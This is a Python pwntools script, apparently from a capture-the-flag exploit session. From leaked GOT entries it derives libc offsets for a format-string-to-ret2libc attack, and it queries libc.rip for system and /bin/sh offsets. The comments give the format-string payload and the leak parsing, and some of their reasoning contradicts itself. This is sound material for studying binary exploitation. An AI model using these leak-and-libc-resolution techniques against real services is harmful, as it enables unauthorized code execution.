from pwn import *

context(arch='i386', os='linux', log_level='info')

# From the format string leak:
# puts: 0xf7d961e0
# printf: 0xf7d43de0

puts_leak = 0xf7d961e0
printf_leak = 0xf7d43de0

log.info(f"puts last 12 bits: 0x{puts_leak & 0xfff:x}")
log.info(f"printf last 12 bits: 0x{printf_leak & 0xfff:x}")

# Check all possible puts offsets
for po in range(0x61e0, 0x100000, 0x1000):
    if (po & 0xfff) != 0x1e0:
        continue
    lb = puts_leak - po
    if lb & 0xfff != 0:
        continue
    if not (0xf7000000 < lb < 0xf7ffffff):
        continue
    
    printf_off = printf_leak - lb
    if printf_off <= 0:
        continue
    if (printf_off & 0xfff) != 0xde0:
        continue
    
    log.info(f"puts_offset=0x{po:x}, libc_base=0x{lb:x}, printf_offset=0x{printf_off:x}")

# Hmm, let me check if the leaked addresses are correct
# The format string output was:
# 20202020c041414130c0040814c0040810c00408e061d9f7e03dd4f780900408c069d9f7b043e7f7308dd7f7
# After header (20 bytes = 5+3+4+4+4):
# e061d9f7 = 0xf7d961e0 (puts)
# e03dd4f7 = 0xf7d43de0 (printf)
# 80900408 = 0x08049080 (write@plt? or some code address)
# c069d9f7 = 0xf7d969c0
# b043e7f7 = 0xf7e743b0
# 308dd7f7 = 0xf7d78d30

# Wait, the third address 0x08049080 is write@plt, not a libc address
# This means %8$s read from puts_got and printed until null byte
# But puts@libc = 0xf7d961e0 has bytes: e0 61 d9 f7
# The next byte after f7 would be... whatever is in memory after puts@GOT
# puts@GOT is at 0x804c014, next is __libc_start_main@GOT at 0x804c018

# So %8$s reads from puts_got (0x804c014) and prints until null
# It prints: puts_addr (4 bytes) + lsm_addr (4 bytes) + ... until null
# That's why we see more than 4 bytes!

# Similarly, %9$s reads from printf_got (0x804c010) and prints until null
# It prints: printf_addr (4 bytes) + puts_addr (4 bytes) + lsm_addr (4 bytes) + ...

# So the actual leaked data is:
# From %8$s (puts_got): puts_addr + lsm_addr + write_addr + ...
# From %9$s (printf_got): printf_addr + puts_addr + lsm_addr + write_addr + ...

# The leaked data after the header:
# e061d9f7 = puts (0xf7d961e0)
# e03dd4f7 = ??? (0xf7d43de0) - this is actually __libc_start_main, not printf!
# 80900408 = write@plt (0x08049080) - wait, this doesn't make sense
# c069d9f7 = ??? (0xf7d969c0)
# b043e7f7 = ??? (0xf7e743b0)
# 308dd7f7 = ??? (0xf7d78d30)

# Wait, I think the issue is that %8$s and %9$s are reading sequentially from memory
# and the output is concatenated

# Let me reconsider: the format string is:
# %5c%7$hhnAAA + target_val_addr + puts_got + printf_got + %8$s%9$s

# %8$s reads from position 8 = puts_got = 0x804c014
# It prints the string at *0x804c014 = puts@libc
# puts@libc = 0xf7d961e0, in bytes: e0 61 d9 f7
# No null bytes, so it continues reading: next 4 bytes at 0x804c018 = __libc_start_main@libc
# And so on until it hits a null byte

# %9$s reads from position 9 = printf_got = 0x804c010
# It prints the string at *0x804c010 = printf@libc
# printf@libc = ??? (we need to figure this out)

# The GOT layout:
# 0x804c010: printf@GOT
# 0x804c014: puts@GOT
# 0x804c018: __libc_start_main@GOT (or another function)

# So %8$s reads from 0x804c014 (puts@GOT) and prints:
# puts_addr (4 bytes) + lsm_addr (4 bytes) + ... until null

# And %9$s reads from 0x804c010 (printf@GOT) and prints:
# printf_addr (4 bytes) + puts_addr (4 bytes) + lsm_addr (4 bytes) + ... until null

# The total leaked data is the concatenation of both %s outputs
# Let me try to separate them

# Actually, the issue is that both %s outputs are concatenated without a separator
# So I can't easily tell where one ends and the other begins

# Let me use a different approach: only leak ONE address per format string
# And use separate connections for each leak

# But first, let me figure out the correct puts offset
# From the previous analysis, puts ends in 0x1e0
# And we know the binary was compiled with GCC 9.4.0 on Ubuntu 20.04
# So it's likely libc-2.31

# For libc-2.31 i386, common puts offsets:
# 0x6d1e0 (what I used before - but /bin/sh was wrong)
# 0x61e0 (smaller offset)

# Let me check: if puts_offset = 0x61e0
# libc_base = 0xf7d961e0 - 0x61e0 = 0xf7d90000
# This is page-aligned!

# If puts_offset = 0x6d1e0
# libc_base = 0xf7d961e0 - 0x6d1e0 = 0xf7d29000
# This is also page-aligned!

# Both are possible. Let me check which one gives a valid printf offset

# For puts_offset = 0x61e0:
# libc_base = 0xf7d90000
# printf_offset = 0xf7d43de0 - 0xf7d90000 = -0x4c220 (negative! impossible)

# For puts_offset = 0x6d1e0:
# libc_base = 0xf7d29000
# printf_offset = 0xf7d43de0 - 0xf7d29000 = 0x1ade0
# printf last 12 bits = 0xde0 ✓

# So puts_offset = 0x6d1e0 is correct!
# And printf_offset = 0x1ade0

# But earlier, /bin/sh at offset 0x18b363 was wrong!
# Let me query libc.rip with puts=0x6d1e0 and printf=0x1ade0

import requests
api_url = "https://libc.rip/api/find"

data = {
    "symbols": {
        "puts": "0x6d1e0",
        "printf": "0x1ade0",
    }
}

try:
    resp = requests.post(api_url, json=data, timeout=10)
    if resp.status_code == 200:
        libs = resp.json()
        log.info(f"Found {len(libs)} matching libc versions:")
        for lib in libs:
            lib_id = lib.get('id', 'unknown')
            symbols = lib.get('symbols', {})
            log.info(f"\n{lib_id}:")
            for sym in sorted(symbols.keys()):
                if sym in ['puts', 'printf', 'system', 'str_bin_sh', '__libc_start_main', 'write', 'execve', 'open', 'read', 'mprotect']:
                    log.info(f"  {sym}: 0x{symbols[sym]}")
    else:
        log.error(f"API error: {resp.status_code} - {resp.text[:200]}")
except Exception as e:
    log.error(f"API query failed: {e}")

# Also try with just puts=0x6d1e0
data2 = {
    "symbols": {
        "puts": "0x6d1e0",
    }
}

try:
    resp2 = requests.post(api_url, json=data2, timeout=10)
    if resp2.status_code == 200:
        libs2 = resp2.json()
        log.info(f"\n\nFound {len(libs2)} matching libc versions with puts=0x6d1e0:")
        seen = set()
        for lib in libs2:
            lib_id = lib.get('id', 'unknown')
            symbols = lib.get('symbols', {})
            puts_off = symbols.get('puts', '0')
            printf_off = symbols.get('printf', '0')
            system_off = symbols.get('system', '0')
            binsh_off = symbols.get('str_bin_sh', '0')
            
            key = (puts_off, system_off, binsh_off)
            if key in seen:
                continue
            seen.add(key)
            
            # Check if printf offset matches
            if isinstance(printf_off, str) and isinstance(puts_off, str):
                try:
                    po = int(puts_off, 16)
                    pro = int(printf_off, 16)
                    # We expect printf_offset = 0x1ade0
                    if pro == 0x1ade0:
                        log.success(f"\n{lib_id}:")
                        log.info(f"  puts: 0x{puts_off}")
                        log.info(f"  printf: 0x{printf_off}")
                        log.info(f"  system: 0x{system_off}")
                        log.info(f"  str_bin_sh: 0x{binsh_off}")
                except:
                    pass
    else:
        log.error(f"API error 2: {resp2.status_code}")
except Exception as e:
    log.error(f"API query 2 failed: {e}")